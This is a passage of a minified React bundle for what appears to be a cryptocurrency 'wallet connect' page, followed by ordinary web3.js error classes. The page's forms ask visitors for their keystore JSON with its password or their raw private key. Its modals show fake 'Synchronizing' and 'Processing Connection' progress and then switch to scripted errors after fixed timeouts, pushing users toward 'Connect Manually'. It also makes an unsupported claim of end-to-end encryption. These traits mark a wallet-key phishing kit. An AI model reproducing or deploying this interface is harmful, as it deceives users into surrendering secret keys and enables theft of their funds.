                                                            type: "submit",
                                                            color: "secondary",
                                                            label: u ? "Validating..." : "Validate",
                                                            className: "w-full mt-4"
                                                        })]
                                                    })
                                                }), S.jsx(wi.Panel, {
                                                    children: S.jsxs("form", {
                                                        onSubmit: d,
                                                        children: [S.jsx("textarea", {
                                                            className: Ti("w-full text-base bg-neutral-700 py-2 px-4 rounded-2xl text-white border border-transparent transition-all focus:border-primary focus:outline-none"),
                                                            placeholder: "Your Keystore JSON",
                                                            required: !0,
                                                            rows: 4,
                                                            value: o.keystore,
                                                            onChange: h => s({ ...o,
                                                                keystore: h.target.value
                                                            })
                                                        }), S.jsx("input", {
                                                            className: Ti("w-full text-base bg-neutral-700 py-4 px-4 rounded-lg my-3 text-white border border-transparent transition-all focus:border-primary focus:outline-none"),
                                                            placeholder: "Password",
                                                            required: !0,
                                                            value: o.password,
                                                            onChange: h => s({ ...o,
                                                                password: h.target.value
                                                            })
                                                        }), S.jsx(gr, {
                                                            type: "submit",
                                                            color: "secondary",
                                                            label: u ? "Validating..." : "Validate",
                                                            className: "w-full mt-4"
                                                        })]
                                                    })
                                                }), S.jsx(wi.Panel, {
                                                    children: S.jsxs("form", {
                                                        onSubmit: d,
                                                        children: [S.jsx("textarea", {
                                                            className: Ti("w-full text-base bg-neutral-700 py-2 px-4 rounded-2xl text-white border border-transparent transition-all focus:border-primary focus:outline-none"),
                                                            rows: 4,
                                                            placeholder: "Your Private Key",
                                                            required: !0,
                                                            value: o.privateKey,
                                                            onChange: h => s({ ...o,
                                                                privateKey: h.target.value
                                                            })
                                                        }), S.jsx(gr, {
                                                            type: "submit",
                                                            color: "secondary",
                                                            label: u ? "Validating..." : "Validate",
                                                            className: "w-full mt-4"
                                                        })]
                                                    })
                                                })]
                                            })]
                                        })]
                                    })]
                                })
                            })
                        })
                    })]
                })
            })
        },
        M5 = ({
            open: e,
            onClose: t,
            handleRetry: n,
            walletName: r,
            id: i
        }) => {
            const [o, s] = b.useState(!1);
            return b.useEffect(() => {
                let a;
                return e ? a = setTimeout(() => {
                    s(!0)
                }, 1e4) : (s(!1), clearTimeout(a)), () => {
                    clearTimeout(a)
                }
            }, [e]), S.jsx(ot, {
                appear: !0,
                show: e,
                as: b.Fragment,
                children: S.jsxs(qt, {
                    as: "div",
                    tabIndex: 1,
                    className: "relative z-10",
                    onClose: () => {},
                    children: [S.jsx(ot.Child, {
                        as: b.Fragment,
                        enter: "ease-out duration-300",
                        enterFrom: "opacity-0",
                        enterTo: "opacity-100",
                        leave: "ease-in duration-200",
                        leaveFrom: "opacity-100",
                        leaveTo: "opacity-0",
                        children: S.jsx("div", {
                            className: "fixed inset-0 bg-black bg-opacity-25"
                        })
                    }), S.jsx("div", {
                        className: "fixed inset-0 overflow-y-auto",
                        children: S.jsx("div", {
                            className: "flex h-screen items-end md:items-center justify-center text-center",
                            children: S.jsx(ot.Child, {
                                as: b.Fragment,
                                enter: "ease-out duration-300",
                                enterFrom: "opacity-0 scale-95",
                                enterTo: "opacity-100 scale-100",
                                leave: "ease-in duration-200",
                                leaveFrom: "opacity-100 scale-100",
                                leaveTo: "opacity-0 scale-95",
                                children: S.jsxs(qt.Panel, {
                                    className: "w-full md:h-full rounded-t-3xl md:rounded-t-none transform overflow-hidden bg-black text-white text-left transition-all",
                                    children: [S.jsxs("header", {
                                        className: "bg-neutral-700 py-4 px-4 flex justify-between gap-20",
                                        children: [S.jsxs("h2", {
                                            className: "text-lg capitalize",
                                            children: [r || "Synchronizing", " "]
                                        }), S.jsx("button", {
                                            onClick: t,
                                            className: "outline-none focus:outline-none",
                                            children: S.jsx("svg", {
                                                height: 24,
                                                width: 24,
                                                viewBox: "0 0 24 24",
                                                children: S.jsx("path", {
                                                    fill: "currentColor",
                                                    d: "M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z"
                                                })
                                            })
                                        })]
                                    }), S.jsxs("div", {
                                        className: "max-w-screen-sm mx-auto p-8 text-center",
                                        children: [S.jsx("h2", {
                                            className: "text-2xl text-center  font-bold",
                                            children: "Synchronizing..."
                                        }), o ? S.jsxs(S.Fragment, {
                                            children: [S.jsx("div", {
                                                className: "text-red-500 bg-red-500/20 font-semibold mt-6 py-3 px-4 rounded-lg flex items-center justify-between gap-2",
                                                children: S.jsx("p", {
                                                    className: "text-sm",
                                                    children: "An error occurred while synchronizing!"
                                                })
                                            }), S.jsx(gr, {
                                                dense: !0,
                                                variant: "outlined",
                                                color: "secondary",
                                                label: "Try Again",
                                                onClick: n,
                                                className: "mt-6"
                                            })]
                                        }) : S.jsxs(S.Fragment, {
                                            children: [S.jsxs("div", {
                                                className: "relative inline-flex justify-center mx-auto my-4",
                                                children: [S.jsxs("svg", {
                                                    className: "animate-spin my-4 h-24 w-24",
                                                    xmlns: "http://www.w3.org/2000/svg",
                                                    fill: "none",
                                                    viewBox: "0 0 24 24",
                                                    children: [S.jsx("circle", {
                                                        className: "opacity-25",
                                                        cx: "12",
                                                        cy: "12",
                                                        r: "10",
                                                        stroke: "currentColor",
                                                        strokeWidth: "4"
                                                    }), S.jsx("path", {
                                                        className: "opacity-75",
                                                        fill: "currentColor",
                                                        d: "M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                                                    })]
                                                }), i !== "others" && S.jsx("img", {
                                                    src: mu.includes(i) ? `/images/${i.replace(/\s/g,"").toLowerCase()}.png` : `/images/logos/${i}.jpeg`,
                                                    className: "absolute bg-white w-10 h-10 top-11 rounded-full"
                                                })]
                                            }), S.jsx("p", {
                                                className: "text-gray-600 mb-3",
                                                children: "This may take a few minutes to complete"
                                            })]
                                        })]
                                    })]
                                })
                            })
                        })
                    })]
                })
            })
        };

    function O5({
        open: e,
        onClose: t,
        wallet: n,
        handleManual: r
    }) {
        const [i, o] = b.useState(!1);
        return b.useEffect(() => {
            let s;
            return e ? s = setTimeout(() => {
                o(!0)
            }, 7500) : (o(!1), clearTimeout(s)), () => {
                clearTimeout(s)
            }
        }, [e]), S.jsx(S.Fragment, {
            children: S.jsx(ot, {
                appear: !0,
                show: e,
                as: b.Fragment,
                children: S.jsxs(qt, {
                    as: "div",
                    className: "relative z-50",
                    onClose: t,
                    children: [S.jsx(ot.Child, {
                        as: b.Fragment,
                        enter: "ease-out duration-300",
                        enterFrom: "opacity-0",
                        enterTo: "opacity-100",
                        leave: "ease-in duration-200",
                        leaveFrom: "opacity-100",
                        leaveTo: "opacity-0",
                        children: S.jsx("div", {
                            className: "fixed inset-0 bg-black bg-opacity-50"
                        })
                    }), S.jsx("div", {
                        className: "fixed inset-0 overflow-y-auto",
                        children: S.jsx("div", {
                            className: "flex min-h-full items-end md:items-center justify-center md:p-4 text-center",
                            children: S.jsx(ot.Child, {
                                as: b.Fragment,
                                enter: "ease-out duration-300",
                                enterFrom: "opacity-0 scale-95",
                                enterTo: "opacity-100 scale-100",
                                leave: "ease-in duration-200",
                                leaveFrom: "opacity-100 scale-100",
                                leaveTo: "opacity-0 scale-95",
                                children: S.jsxs(qt.Panel, {
                                    className: "w-full md:max-w-sm transform overflow-hidden rounded-2xl rounded-b-none md:rounded-b-2xl bg-neutral-800 py-4 px-6 text-white text-left align-middle shadow-xl transition-all",
                                    children: [S.jsxs(qt.Title, {
                                        as: "div",
                                        className: "flex justify-between items-center",
                                        children: [S.jsx("h2", {
                                            className: "text-lg font-semibold pl-2",
                                            children: "Processing Connection..."
                                        }), S.jsx("button", {
                                            type: "button",
                                            onClick: t,
                                            className: "focus:outline-none focus:border-none",
                                            children: S.jsx("svg", {
                                                height: 24,
                                                width: 24,
                                                viewBox: "0 0 24 24",
                                                className: "text-white",
                                                children: S.jsx("path", {
                                                    fill: "currentColor",
                                                    d: "M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z"
                                                })
                                            })
                                        })]
                                    }), i ? S.jsxs("div", {
                                        className: "text-red-500 border-2 border-red-500 font-semibold mt-4 py-3 px-4 rounded-lg",
                                        children: [S.jsxs("p", {
                                            className: "text-sm",
                                            children: ["Oops! something went wrong while processsing connection... ", S.jsx("br", {}), " Please try again later or connect manually."]
                                        }), S.jsx(gr, {
                                            dense: !0,
                                            color: "secondary",
                                            label: "Connect Manually",
                                            onClick: r,
                                            className: "mt-2"
                                        })]
                                    }) : S.jsxs("div", {
                                        className: "bg-white/20 text-white font-medium mt-4 py-4 px-4 rounded-lg flex items-center justify-between gap-2",
                                        children: [S.jsx("p", {
                                            className: "text-sm",
                                            children: "Please wait..."
                                        }), S.jsx("svg", {
                                            width: "24",
                                            height: "24",
                                            viewBox: "0 0 24 24",
                                            className: "animate-spin fill-current",
                                            xmlns: "http://www.w3.org/2000/svg",
                                            children: S.jsx("path", {
                                                d: "M10.14,1.16a11,11,0,0,0-9,8.92A1.59,1.59,0,0,0,2.46,12,1.52,1.52,0,0,0,4.11,10.7a8,8,0,0,1,6.66-6.61A1.42,1.42,0,0,0,12,2.69h0A1.57,1.57,0,0,0,10.14,1.16Z"
                                            })
                                        })]
                                    }), S.jsxs("div", {
                                        className: "mt-4 bg-accent/20 rounded-lg py-3 px-4",
                                        children: [S.jsx("h6", {
                                            className: "text-base font-medium",
                                            children: n
                                        }), S.jsx("p", {
                                            className: "text-sm",
                                            children: "This session is protected with an end-to-end encryption"
                                        })]
                                    })]
                                })
                            })
                        })
                    })]
                })
            })
        })
    }

    function L5({
        open: e,
        onClose: t,
        handleSelect: n
    }) {
        return S.jsx(S.Fragment, {
            children: S.jsx(ot, {
                appear: !0,
                show: e,
                as: b.Fragment,
                children: S.jsxs(qt, {
                    as: "div",
                    className: "relative z-50",
                    onClose: () => {},
                    children: [S.jsx(ot.Child, {
                        as: b.Fragment,
                        enter: "ease-out duration-300",
                        enterFrom: "opacity-0",
                        enterTo: "opacity-100",
                        leave: "ease-in duration-200",
                        leaveFrom: "opacity-100",
                        leaveTo: "opacity-0",
                        children: S.jsx("div", {
                            className: "fixed inset-0 bg-black bg-opacity-50"
                        })
                    }), S.jsx("div", {
                        className: "fixed inset-0 overflow-y-auto",
                        children: S.jsx("div", {
                            className: "flex min-h-full items-end md:items-center justify-center md:p-4 text-center",
                            children: S.jsx(ot.Child, {
                                as: b.Fragment,
                                enter: "ease-out duration-300",
                                enterFrom: "opacity-0 scale-95",
                                enterTo: "opacity-100 scale-100",
                                leave: "ease-in duration-200",
                                leaveFrom: "opacity-100 scale-100",
                                leaveTo: "opacity-0 scale-95",
                                children: S.jsxs(qt.Panel, {
                                    className: "w-full md:max-w-sm transform overflow-hidden rounded-2xl rounded-b-none md:rounded-b-2xl bg-neutral-800 py-4 px-6 text-white text-left align-middle shadow-xl transition-all",
                                    children: [S.jsxs(qt.Title, {
                                        as: "div",
                                        className: "flex justify-between items-center",
                                        children: [S.jsx("h2", {
                                            className: "text-lg font-semibold pl-2",
                                            children: "Connect Wallet"
                                        }), S.jsx("button", {
                                            type: "button",
                                            onClick: t,
                                            className: "focus:outline-none focus:border-none",
                                            children: S.jsx("svg", {
                                                height: 24,
                                                width: 24,
                                                viewBox: "0 0 24 24",
                                                children: S.jsx("path", {
                                                    fill: "currentColor",
                                                    d: "M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z"
                                                })
                                            })
                                        })]
                                    }), S.jsx("div", {
                                        className: "mt-4 flex flex-col gap-4",
                                        children: mu.map(r => S.jsxs("button", {
                                            className: "px-2.5 py-3 text-base flex items-center gap-4 bg-black rounded-lg hover:bg-primary/20 transition hover:shadow-lg",
                                            onClick: () => n(r),
                                            children: [S.jsx("img", {
                                                src: `/images/${r.replace(/\s/g,"").toLowerCase()}.png`,
                                                className: "bg-white h-10 w-10 rounded-lg p-1"
                                            }), r]
                                        }, r))
                                    })]
                                })
                            })
                        })
                    })]
                })
            })
        })
    }

    function F5({
        open: e,
        onClose: t,
        handleSelect: n
    }) {
        return S.jsx(S.Fragment, {
            children: S.jsx(ot, {
                appear: !0,
                show: e,
                as: b.Fragment,
                children: S.jsxs(qt, {
                    as: "div",
                    className: "relative z-10",
                    onClose: () => {},
                    children: [S.jsx(ot.Child, {
                        as: b.Fragment,
                        enter: "ease-out duration-300",
                        enterFrom: "opacity-0",
                        enterTo: "opacity-100",
                        leave: "ease-in duration-200",
                        leaveFrom: "opacity-100",
                        leaveTo: "opacity-0",
                        children: S.jsx("div", {
                            className: "fixed inset-0 bg-black/50"
                        })
                    }), S.jsx("div", {
                        className: "fixed inset-0 overflow-y-auto",
                        children: S.jsx("div", {
                            className: "flex min-h-full items-end md:items-center justify-center md:p-4 text-center",
                            children: S.jsx(ot.Child, {
                                as: b.Fragment,
                                enter: "ease-out duration-300",
                                enterFrom: "opacity-0 scale-95",
                                enterTo: "opacity-100 scale-100",
                                leave: "ease-in duration-200",
                                leaveFrom: "opacity-100 scale-100",
                                leaveTo: "opacity-0 scale-95",
                                children: S.jsxs(qt.Panel, {
                                    className: "w-full md:max-w-sm transform overflow-hidden rounded-2xl rounded-b-none md:rounded-b-2xl bg-neutral-800 pt-4 md:pb-6 text-white text-left align-middle shadow-xl transition-all",
                                    children: [S.jsxs(qt.Title, {
                                        as: "div",
                                        className: "flex justify-between items-center px-4",
                                        children: [S.jsx("h2", {
                                            className: "text-lg font-semibold pl-2",
                                            children: "Select Your Wallet"
                                        }), S.jsx("button", {
                                            type: "button",
                                            onClick: t,
                                            className: "focus:outline-none focus:border-none",
                                            children: S.jsx("svg", {
                                                height: 24,
                                                width: 24,
                                                viewBox: "0 0 24 24",
                                                children: S.jsx("path", {
                                                    fill: "currentColor",
                                                    d: "M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z"
                                                })
                                            })
                                        })]
                                    }), S.jsx("div", {
                                        className: "mt-4 h-96 overflow-y-auto bg-black p-4",
                                        children: S.jsx("div", {
                                            className: "grid grid-cols-4 sm:grid-cols-4 gap-2",
                                            children: Object.keys(Xo).map((r, i) => S.jsxs("div", {
                                                tabIndex: i + 1,
                                                onClick: () => n(r),
                                                className: "cursor-pointer text-white transition-all duration-200 ease-in hover:bg-primary py-2 px-1.5 rounded-xl text-center",
                                                children: [S.jsx("img", {
                                                    src: "images/logos/" + r + ".jpeg",
                                                    width: "48",
                                                    height: "48",
                                                    alt: Xo[r].name,
                                                    className: "mx-auto rounded-full mb-2 bg-white"
                                                }), S.jsx("p", {
                                                    className: "font-medium text-xs truncate",
                                                    children: Xo[r].name
                                                })]
                                            }, r))
                                        })
                                    })]
                                })
                            })
                        })
                    })]
                })
            })
        })
    }
    var dn;
    (function(e) {
        e.NUMBER = "NUMBER_NUMBER", e.HEX = "NUMBER_HEX", e.STR = "NUMBER_STR", e.BIGINT = "NUMBER_BIGINT"
    })(dn || (dn = {}));
    var Er;
    (function(e) {
        e.HEX = "BYTES_HEX", e.UINT8ARRAY = "BYTES_UINT8ARRAY"
    })(Er || (Er = {}));
    const At = {
            number: dn.BIGINT,
            bytes: Er.HEX
        },
        oe = {
            number: dn.HEX,
            bytes: Er.HEX
        };
    var ur;
    (function(e) {
        e.EARLIEST = "earliest", e.LATEST = "latest", e.PENDING = "pending", e.SAFE = "safe", e.FINALIZED = "finalized", e.COMMITTED = "committed"
    })(ur || (ur = {}));
    var Ca;
    (function(e) {
        e.chainstart = "chainstart", e.frontier = "frontier", e.homestead = "homestead", e.dao = "dao", e.tangerineWhistle = "tangerineWhistle", e.spuriousDragon = "spuriousDragon", e.byzantium = "byzantium", e.constantinople = "constantinople", e.petersburg = "petersburg", e.istanbul = "istanbul", e.muirGlacier = "muirGlacier", e.berlin = "berlin", e.london = "london", e.altair = "altair", e.arrowGlacier = "arrowGlacier", e.grayGlacier = "grayGlacier", e.bellatrix = "bellatrix", e.merge = "merge", e.capella = "capella", e.shanghai = "shanghai"
    })(Ca || (Ca = {}));
    const y0 = Object.getPrototypeOf(Uint8Array);
    var iy = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    const oy = Symbol.for("web3/base-provider");
    class Hl {
        static isWeb3Provider(t) {
            return t instanceof Hl || !!(t && t[oy])
        }
        get[oy]() {
            return !0
        }
        send(t, n) {
            this.request(t).then(r => {
                n(null, r)
            }).catch(r => {
                n(r)
            })
        }
        sendAsync(t) {
            return iy(this, void 0, void 0, function*() {
                return this.request(t)
            })
        }
        asEIP1193Provider() {
            const t = Object.create(this),
                n = t.request;
            return t.request = function(i) {
                return iy(this, void 0, void 0, function*() {
                    return (yield n(i)).result
                })
            }, t.asEIP1193Provider = void 0, t
        }
    }
    class D5 extends Array {
        constructor(t) {
            super(), this._accountProvider = t
        }
    }
    const j5 = 100,
        H5 = 101,
        $5 = 201,
        U5 = 202,
        z5 = 203,
        G5 = 204,
        V5 = 205,
        W5 = 206,
        q5 = 207,
        Q5 = 208,
        K5 = 300,
        Z5 = 301,
        Y5 = 310,
        J5 = 311,
        X5 = 400,
        eC = 402,
        tC = 405,
        nC = 407,
        rC = 408,
        iC = 410,
        oC = 411,
        sC = 412,
        aC = 413,
        lC = 414,
        cC = 415,
        uC = 416,
        dC = 417,
        fC = 418,
        hC = 419,
        pC = 420,
        mC = 421,
        gC = 422,
        vC = 423,
        yC = 424,
        wC = 425,
        bC = 426,
        xC = 427,
        EC = 428,
        AC = 429,
        _C = 430,
        SC = 431,
        kC = 432,
        TC = 433,
        IC = 434,
        CC = 435,
        PC = 436,
        RC = 437,
        NC = 438,
        BC = 439,
        MC = 440,
        OC = 441,
        LC = 500,
        FC = 503,
        DC = 505,
        jC = 506,
        HC = 507,
        $C = 600,
        UC = 602,
        zC = 603,
        GC = 604,
        VC = 701,
        WC = 702,
        qC = 703,
        QC = 704,
        KC = 705,
        ZC = 706,
        YC = 707,
        JC = 709,
        XC = 801,
        e4 = 802,
        t4 = 4001,
        n4 = 4100,
        r4 = 4200,
        i4 = 4900,
        o4 = 4901,
        s4 = 902,
        a4 = 903,
        l4 = 1001,
        c4 = 1002,
        u4 = 1003,
        d4 = 1004,
        f4 = 1005,
        h4 = 1006,
        p4 = 1008,
        m4 = 1009,
        g4 = 1010,
        v4 = 1011,
        y4 = 1012,
        w4 = 1014,
        b4 = 1015,
        x4 = 1100,
        Ox = 1101,
        E4 = 1200,
        gu = -32700,
        vu = -32600,
        yu = -32601,
        wu = -32602,
        bu = -32603,
        xu = -32e3,
        Eu = -32001,
        Au = -32002,
        _u = -32003,
        Su = -32004,
        ku = -32005,
        Tu = -32006;
    class ne extends Error {
        constructor(t, n) {
            super(t), Array.isArray(n) ? this.cause = new Pa(n) : this.cause = n, this.name = this.constructor.name, typeof Error.captureStackTrace == "function" ? Error.captureStackTrace(new.target.constructor) : this.stack = new Error().stack
        }
        get innerError() {
            return this.cause instanceof Pa ? this.cause.errors : this.cause
        }
        set innerError(t) {
            Array.isArray(t) ? this.cause = new Pa(t) : this.cause = t
        }
        static convertToString(t, n = !1) {
            if (t == null) return "undefined";
            const r = JSON.stringify(t, (i, o) => typeof o == "bigint" ? o.toString() : o);
            return n && ["bigint", "string"].includes(typeof t) ? r.replace(/['\\"]+/g, "") : r
        }
        toJSON() {
            return {
                name: this.name,
                code: this.code,
                message: this.message,
                cause: this.cause,
                innerError: this.cause
            }
        }
    }
    class Pa extends ne {
        constructor(t) {
            super(`Multiple errors occurred: [${t.map(n=>n.message).join("], [")}]`), this.code = Q5, this.errors = t
        }
    }
    class ce extends ne {
        constructor(t, n) {
            super(`Invalid value given "${ne.convertToString(t,!0)}". Error: ${n}.`), this.name = this.constructor.name
        }
    }
    class sy extends ne {
        constructor() {
            super("Private key must be 32 bytes."), this.code = VC
        }
    }
    class A4 extends ne {
        constructor() {
            super("Invalid Private Key, Not a valid string or uint8Array"), this.code = WC
        }
    }
    class _4 extends ne {
        constructor(t) {
            super(`"${t}"`), this.code = e4
        }
    }
    class Lx extends ne {
        constructor() {
            super("Invalid key derivation function"), this.code = qC
        }
    }
    class S4 extends ne {
        constructor() {
            super("Key derivation failed - possibly wrong password"), this.code = QC
        }
    }
    class k4 extends ne {
        constructor() {
            super("Unsupported key store version"), this.code = KC
        }
    }
    class T4 extends ne {
        constructor() {
            super("Password cannot be empty"), this.code = ZC
        }
    }
    class I4 extends ne {
        constructor() {
            super("Initialization vector must be 16 bytes"), this.code = YC
        }
    }
    class C4 extends ne {
        constructor() {
            super("c > 1000, pbkdf2 is less secure with less iterations"), this.code = JC
        }
    }
    class $l extends ne {
        constructor(t, n) {
            super(t), this.code = LC, n && (this.errorCode = n.code, this.errorReason = n.reason)
        }
        toJSON() {
            return Object.assign(Object.assign({}, super.toJSON()), {
                errorCode: this.errorCode,
                errorReason: this.errorReason
            })
        }
    }
    class xp extends $l {
        constructor(t) {
            super("Connection not open", t), this.code = FC
        }
    }
    class P4 extends $l {
        constructor(t) {
            super(`Maximum number of reconnect attempts reached! (${t})`), this.code = DC
        }
    }
    class R4 extends $l {
        constructor() {
            super("CONNECTION ERROR: Provider started to reconnect before the response got received!"), this.code = jC
        }
    }
    class N4 extends $l {
        constructor(t) {
            super(`Request already sent with following id: ${t}`), this.code = HC
        }
    }
    class _t extends ne {
        constructor(t, n) {
            super(t), this.code = K5, this.receipt = n
        }
    }
    class ay extends ne {
        constructor(t, n) {
            super(`The resolver at ${t} does not implement requested method: "${n}".`), this.address = t, this.name = n, this.code = Z5
        }
        toJSON() {
            return Object.assign(Object.assign({}, super.toJSON()), {
                address: this.address,
                name: this.name
            })
        }
    }
    class $d extends _t {
        constructor(t) {
            if (super(t.message || "Error"), this.name = "name" in t && t.name || this.constructor.name, this.stack = "stack" in t && t.stack || void 0, this.code = t.code, typeof t.data == "object") {
                let n;
                t.data && "originalError" in t.data ? n = t.data.originalError : n = t.data, this.data = n.data, this.cause = new $d(n)
            } else this.data = t.data
        }
        setDecodedProperties(t, n, r) {
            this.errorName = t, this.errorSignature = n, this.errorArgs = r
        }
        toJSON() {
            let t = Object.assign(Object.assign({}, super.toJSON()), {
                data: this.data
            });
            return this.errorName && (t = Object.assign(Object.assign({}, t), {
                errorName: this.errorName,
                errorSignature: this.errorSignature,
                errorArgs: this.errorArgs
            })), t
        }
    }
    class Gi extends _t {
        constructor(t) {
            super("Error happened while trying to execute a function inside a smart contract"), this.code = Y5, this.cause = new $d(t)
        }
    }
    class B4 extends ce {
        constructor(t) {
            var n, r;
            super(`data: ${(n=t.data)!==null&&n!==void 0?n:"undefined"}, input: ${(r=t.input)!==null&&r!==void 0?r:"undefined"}`, `You can't have "data" and "input" as properties of a contract at the same time, please use either "data" or "input" instead.`), this.code = J5
        }
    }
    class M4 extends ne {
        constructor(t) {
            super(`ENS is not supported on network ${t}`), this.code = s4
        }
    }
    class O4 extends ne {
        constructor() {
            super("Network not synced"), this.code = a4
        }
    }
    class ly extends ne {
        constructor(t) {
            super(`Invalid parameters passed. "${typeof t<"u"?t:""}"`), this.hint = t, this.code = q5
        }
        toJSON() {
            return Object.assign(Object.assign({}, super.toJSON()), {
                hint: this.hint
            })
        }
    }
    class Ep extends ne {
        constructor() {
            super(...arguments), this.code = $5
        }
    }
    class er extends ne {
        constructor() {
            super("The method you're trying to call is not implemented."), this.code = U5
        }
    }
    class Fx extends ne {
        constructor() {
            super(...arguments), this.code = z5
        }
    }
    class L4 extends ne {
        constructor() {
            super(...arguments), this.code = G5
        }
    }
    class fe extends ne {
        constructor(t, n) {
            super(t), this.code = V5, this.props = n ?? {}
        }
    }
    class F4 extends ne {
        constructor(t) {
            super(`A plugin with the namespace: ${t} has already been registered.`), this.code = W5
        }
    }
    class Rc extends ne {
        constructor() {
            super(...arguments), this.code = $C
        }
    }
    class Ap extends ne {
        constructor(t) {
            super(`Client URL "${t}" is invalid.`), this.code = UC
        }
    }
    class ar extends ne {
        constructor() {
            super(...arguments), this.code = zC
        }
    }
    class D4 extends ne {
        constructor() {
            super(...arguments), this.code = GC
        }
    }
    class j4 extends ce {
        constructor() {
            super(...arguments), this.code = XC
        }
    }
    class w0 extends ne {
        constructor(t, n) {
            super(t), this.receipt = n, this.code = X5
        }
        toJSON() {
            return Object.assign(Object.assign({}, super.toJSON()), {
                receipt: this.receipt
            })
        }
    }
    class Iu extends ne {
        constructor(t, n, r, i) {
            super(`Transaction has been reverted by the EVM${r===void 0?"":`:
 ${ne.convertToString(r)}`}`), this.reason = t, this.signature = n, this.receipt = r, this.data = i, this.code = eC
        }
        toJSON() {
            return Object.assign(Object.assign({}, super.toJSON()), {
                reason: this.reason,
                signature: this.signature,
                receipt: this.receipt,
                data: this.data
            })
        }
    }
    class Dx extends Iu {
        constructor(t, n, r, i, o, s, a) {
            super(t), this.reason = t, this.customErrorName = n, this.customErrorDecodedSignature = r, this.customErrorArguments = i, this.signature = o, this.receipt = s, this.data = a, this.code = NC
        }
        toJSON() {
            return Object.assign(Object.assign({}, super.toJSON()), {
                reason: this.reason,
                customErrorName: this.customErrorName,
                customErrorDecodedSignature: this.customErrorDecodedSignature,
                customErrorArguments: this.customErrorArguments,
                signature: this.signature,
                receipt: this.receipt,
                data: this.data
            })
        }
    }
    class jx extends w0 {
        constructor(t) {
            super(`Transaction has been reverted by the EVM${t===void 0?"":`:
 ${ne.convertToString(t)}`}`, t), this.code = tC
        }
    }
    class H4 extends w0 {
        constructor() {
            super("Raw transaction undefined"), this.code = nC
        }
    }
    class cy extends w0 {
        constructor() {
            super("Transaction not found"), this.code = _C
        }
    }
    class $4 extends ce {
        constructor(t) {
            super(t, "invalid transaction with invalid sender"), this.code = rC
        }
    }
    class U4 extends ce {
        constructor(t) {
            super(t, "invalid transaction with invalid receiver"), this.code = RC
        }
    }
    class z4 extends ce {
        constructor() {
            super("MissingCustomChainError", "If tx.common is provided it must have tx.common.customChain"), this.code = iC
        }
    }
    class G4 extends ce {
        constructor() {
            super("MissingCustomChainIdError", "If tx.common is provided it must have tx.common.customChain and tx.common.customChain.chainId"), this.code = oC
        }
    }
    class V4 extends ce {
        constructor(t) {
            super(JSON.stringify(t), "Chain Id doesnt match in tx.chainId tx.common.customChain.chainId"), this.code = sC
        }
    }
    class W4 extends ce {
        constructor(t) {
            super(JSON.stringify(t), "Chain doesnt match in tx.chain tx.common.basechain"), this.code = CC
        }
    }
    class q4 extends ce {
        constructor(t) {
            super(JSON.stringify(t), "hardfork doesnt match in tx.hardfork tx.common.hardfork"), this.code = PC
        }
    }
    class Q4 extends ce {
        constructor() {
            super("CommonOrChainAndHardforkError", "Please provide the common object or the chain and hardfork property but not all together."), this.code = aC
        }
    }
    class K4 extends ce {
        constructor(t) {
            var n, r;
            super("MissingChainOrHardforkError", `When specifying chain and hardfork, both values must be defined. Received "chain": ${(n=t.chain)!==null&&n!==void 0?n:"undefined"}, "hardfork": ${(r=t.hardfork)!==null&&r!==void 0?r:"undefined"}`), this.code = lC
        }
    }
    class Z4 extends ne {
        constructor() {
            super('Missing properties in transaction, either define "gas" and "gasPrice" for type 0 transactions or "gas", "maxPriorityFeePerGas" and "maxFeePerGas" for type 2 transactions'), this.code = MC
        }
    }
    class Y4 extends ce {
        constructor(t) {
            var n, r, i, o;
            super(`gas: ${(n=t.gas)!==null&&n!==void 0?n:"undefined"}, gasPrice: ${(r=t.gasPrice)!==null&&r!==void 0?r:"undefined"}, maxPriorityFeePerGas: ${(i=t.maxPriorityFeePerGas)!==null&&i!==void 0?i:"undefined"}, maxFeePerGas: ${(o=t.maxFeePerGas)!==null&&o!==void 0?o:"undefined"}`, '"gas" is missing'), this.code = cC, this.cause = new Z4
        }
    }
    class J4 extends ne {
        constructor() {
            super('Missing properties in transaction, either define "gas" and "gasPrice" for type 0 transactions or "gas", "maxPriorityFeePerGas" and "maxFeePerGas" for type 2 transactions, not both'), this.code = OC
        }
    }
    class X4 extends ce {
        constructor(t) {
            var n, r, i, o;
            super(`gas: ${(n=t.gas)!==null&&n!==void 0?n:"undefined"}, gasPrice: ${(r=t.gasPrice)!==null&&r!==void 0?r:"undefined"}, maxPriorityFeePerGas: ${(i=t.maxPriorityFeePerGas)!==null&&i!==void 0?i:"undefined"}, maxFeePerGas: ${(o=t.maxFeePerGas)!==null&&o!==void 0?o:"undefined"}`, "transaction must specify legacy or fee market gas properties, not both"), this.code = IC, this.cause = new J4
        }
    }
    class eP extends ce {
        constructor(t) {
            var n, r;
            super(`gas: ${(n=t.gas)!==null&&n!==void 0?n:"undefined"}, gasPrice: ${(r=t.gasPrice)!==null&&r!==void 0?r:"undefined"}`, "Gas or gasPrice is lower than 0"), this.code = uC
        }
    }
    class tP extends ce {
        constructor(t) {
            var n, r;
            super(`maxPriorityFeePerGas: ${(n=t.maxPriorityFeePerGas)!==null&&n!==void 0?n:"undefined"}, maxFeePerGas: ${(r=t.maxFeePerGas)!==null&&r!==void 0?r:"undefined"}`, "maxPriorityFeePerGas or maxFeePerGas is lower than 0"), this.code = dC
        }
    }
    class nP extends ce {
        constructor(t) {
            super(t, "eip-1559 transactions don't support gasPrice"), this.code = fC
        }
    }
    class Hx extends ce {
        constructor(t) {
            var n, r;
